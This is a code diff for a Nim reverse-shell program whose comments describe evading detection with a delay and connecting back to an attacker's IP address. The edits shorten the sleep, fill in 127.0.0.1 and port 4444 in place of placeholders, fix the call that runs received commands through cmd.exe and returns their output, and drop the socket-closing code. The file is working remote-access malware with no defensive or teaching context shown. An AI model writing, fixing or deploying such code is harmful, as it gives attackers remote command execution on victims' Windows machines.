@@ -2,12 +2,12 @@ import std/net, osproc, os, strformat
 
 proc main() =
   # Sleep for 30,000 milliseconds (20 seconds) to potentially evade detection
-  sleep(30000)
+  sleep(5000)
 
   # Define the attacker's IP address and port number
   let
-    ip = "attacker ip"  # Replace with the actual IP address of the attacker
-    port = 1234         # Replace with the actual port number the attacker is listening on
+    ip = "127.0.0.1"  # Replace with the actual IP address of the attacker
+    port = 4444         # Replace with the actual port number the attacker is listening on
 
   # Create a new socket
   let socket = newSocket()
@@ -31,17 +31,11 @@ proc main() =
       let bad = recvLine(socket)
 
       # Execute the received command using cmd.exe (on Windows) and capture the output
-      let cmd = execProcess(fmt"cmd.exe /c {bad}", bad)
+      let cmd = execProcess(fmt"cmd.exe /c {bad}")
 
       # Send the output of the executed command back to the attacker
       send(socket, cmd)
     except OSError:
       # If an error occurs, send an error message back to the attacker
       send(socket, "An error occurred while processing the command")
-    finally:
-      try:
-        # Close the socket
-        socket.close()
-      except OSError:
-        quit("Failed to close the socket")
 main()
